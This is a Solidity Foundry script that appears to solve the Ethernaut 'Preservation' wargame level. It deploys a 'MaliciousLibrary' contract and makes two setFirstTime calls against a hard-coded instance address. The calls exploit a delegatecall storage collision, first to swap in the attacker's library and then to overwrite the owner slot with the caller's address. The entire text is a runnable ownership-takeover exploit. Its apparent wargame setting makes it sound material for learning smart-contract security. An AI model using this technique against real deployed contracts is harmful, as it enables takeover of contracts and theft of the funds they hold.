// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IPreservation
{
    function setFirstTime(uint256 _timeStamp) external;
}
contract MaliciousLibrary
{
    address public slot0;
    address public slot1;
    address public owner;

    function setTime(uint256 _owner) public
    {
        owner = address(uint160(_owner));
    }
}

contract PreservationSolution is Script
{
    function run() external
    {
        address instance = 0xE360Bda841ce09FF9160aadF4d39B819Ca5B2309;
        
        vm.startBroadcast();
        MaliciousLibrary mal = new MaliciousLibrary();
        IPreservation pre = IPreservation(instance);
        pre.setFirstTime(uint256(uint160(address(mal)))); // set my custom contract to the storage
        
        pre.setFirstTime(uint256(uint160(msg.sender))); // get ownership
        
        vm.stopBroadcast();
    }
}
